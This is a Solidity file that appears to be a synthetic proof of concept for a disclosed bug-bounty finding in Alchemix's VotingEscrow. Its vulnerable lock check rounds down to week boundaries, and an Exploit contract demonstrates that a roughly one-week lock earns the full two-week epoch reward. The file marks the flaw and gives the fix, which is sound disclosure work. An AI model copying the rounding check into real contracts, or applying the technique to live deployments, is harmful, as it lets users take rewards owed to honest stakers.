// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Alchemix — BPT can be locked for only 1 week, resulting in unfair ALCX
    reward distribution (Immunefi, marchev, finding #38178)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: VotingEscrow::_createLock enforces a minimum lock duration of
    1 epoch (2 weeks) via:
        require(unlockTime >= (((block.timestamp + EPOCH) / WEEK) * WEEK), "Voting lock must be 1 epoch");
    Both sides of this check ROUND DOWN to a WEEK boundary. As block.timestamp
    approaches the next epoch boundary from below, the required unlockTime
    (the right-hand side) stops advancing (it's already rounded to the SAME
    upcoming boundary), while the ACTUAL minimum lockDuration needed to reach
    it shrinks continuously. A user locking just before the boundary can pass
    the check with barely more than half the required 2-week duration.

    Because reward eligibility for an epoch depends only on whether a lock
    exists and passed this check -- not on the actual lockDuration -- a lock
    that snuck in under the minimum earns the SAME flat epoch reward as a
    lock that honored the full 2-week minimum.

    NOTE ON TIME: the browser Playground's synthetic Exploit runs cheatcode-
    free (no vm.warp), so block.timestamp cannot literally advance between
    two calls within one run(). To demonstrate the SAME check evaluated at
    two different real-world block times (as the two lock-creation
    transactions in the original finding are, days apart), `_createLock`
    below takes an explicit `nowTs` parameter standing in for block.timestamp
    -- the only deviation from the source. The check's arithmetic itself,
    `unlockTime >= (((nowTs + EPOCH) / WEEK) * WEEK)`, is byte-for-byte
    identical to the source with that one substitution.
//////////////////////////////////////////////////////////////////////////*/

contract MockALCX {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }
}

/// @notice Reduced VotingEscrow: only the minimum-lock-duration check and
///         enough state to demonstrate the reward-eligibility consequence.
contract VotingEscrow {
    uint256 public constant WEEK = 7 days;
    uint256 public constant EPOCH = 2 weeks;

    mapping(uint256 => uint256) public lockDuration;
    mapping(uint256 => uint256) public unlockTimeOf;
    uint256 public nextTokenId = 1;

    /// @notice src/VotingEscrow.sol::_createLock (reduced). `nowTs` stands in
    ///         for block.timestamp -- see file header note.
    function createLock(uint256 _value, uint256 _lockDuration, uint256 nowTs) external returns (uint256 tokenId) {
        uint256 unlockTime = ((nowTs + _lockDuration) / WEEK) * WEEK;

        // @> VULN: both sides round down to a WEEK boundary. As nowTs
        //          approaches the next epoch boundary, the RHS stops
        //          advancing while the actual _lockDuration needed to
        //          satisfy the check keeps shrinking.
        require(unlockTime >= (((nowTs + EPOCH) / WEEK) * WEEK), "Voting lock must be 1 epoch");
        // FIX: require(_lockDuration >= EPOCH, "Voting lock must be 1 epoch");
        //      (check the DURATION directly, not a rounded absolute timestamp)

        tokenId = nextTokenId++;
        lockDuration[tokenId] = _lockDuration;
        unlockTimeOf[tokenId] = unlockTime;
        _value; // silence unused-var warning; value accounting omitted (orthogonal to this bug)
    }
}

/// @notice Flat per-epoch ALCX distributor: any lock that passed the
///         minimum-duration check is "epoch-eligible" and receives the same
///         fixed reward, regardless of its actual lockDuration.
contract Distributor {
    VotingEscrow public immutable VE;
    MockALCX public immutable ALCX_TOKEN;
    uint256 public constant FLAT_REWARD = 1000 ether;
    mapping(uint256 => uint256) public claimable;

    constructor(VotingEscrow ve, MockALCX alcx) {
        VE = ve;
        ALCX_TOKEN = alcx;
    }

    function distributeEpoch(uint256 tokenId) external {
        // Any tokenId that exists (i.e. passed _createLock's minimum-duration
        // check) is eligible for the full flat epoch reward.
        require(VE.unlockTimeOf(tokenId) != 0, "not a valid lock");
        claimable[tokenId] += FLAT_REWARD;
    }

    function claim(uint256 tokenId, address to) external {
        uint256 amt = claimable[tokenId];
        claimable[tokenId] = 0;
        ALCX_TOKEN.mint(to, amt);
    }
}

contract Exploit {
    VotingEscrow public ve;
    Distributor public distributor;
    MockALCX public alcx;

    address public constant ALICE = address(0xA11CE);
    address public constant BOB = address(0xB0B);

    // Next epoch starts at this anchor timestamp (mirrors the finding's own
    // example: "Next epoch starts at 1717632000").
    uint256 public constant NEXT_EPOCH_START = 1717632000;

    uint256 public aliceTokenId;
    uint256 public bobTokenId;

    constructor() {
        alcx = new MockALCX();
        ve = new VotingEscrow();
        distributor = new Distributor(ve, alcx);
    }

    function run() external {
        // Alice locks HONESTLY for the full 2-week minimum, 2 weeks before
        // the epoch boundary.
        uint256 aliceNow = NEXT_EPOCH_START - 2 weeks;
        aliceTokenId = ve.createLock(1e18, 2 weeks, aliceNow);
        require(ve.lockDuration(aliceTokenId) == 2 weeks, "sanity: Alice locked for the full 2-week minimum");

        // Bob locks for just 7 days + 1 second, exactly 7 days + 1 second
        // before the SAME epoch boundary -- precisely the finding's own
        // example values.
        uint256 bobNow = NEXT_EPOCH_START - (7 days + 1 seconds);
        bobTokenId = ve.createLock(1e18, 7 days + 1 seconds, bobNow);

        // HARM (part 1): the check PASSED for Bob despite his lock duration
        // being roughly HALF the required minimum epoch.
        require(ve.lockDuration(bobTokenId) < ve.EPOCH(), "harm not demonstrated: Bob's lock duration should be below the minimum epoch");
        require(ve.lockDuration(bobTokenId) == 7 days + 1 seconds, "sanity: Bob's actual lock duration");

        // Both unlock at (effectively) the same epoch boundary.
        require(ve.unlockTimeOf(aliceTokenId) == ve.unlockTimeOf(bobTokenId), "sanity: both locks resolve to the same unlock boundary");

        // Epoch turns over; both locks are eligible and receive the flat reward.
        distributor.distributeEpoch(aliceTokenId);
        distributor.distributeEpoch(bobTokenId);
        distributor.claim(aliceTokenId, ALICE);
        distributor.claim(bobTokenId, BOB);

        // HARM (part 2): Bob receives the SAME reward as Alice despite
        // locking for less than half the required duration -- reward
        // rightfully belonging to compliant, full-duration lockers is
        // diluted by Bob's non-compliant lock.
        require(alcx.balanceOf(BOB) == alcx.balanceOf(ALICE), "harm not demonstrated: Bob should receive the same reward as Alice despite the shorter lock");
        require(alcx.balanceOf(BOB) == 1000 ether, "harm not demonstrated: Bob's unfairly-earned ALCX reward");
    }
}
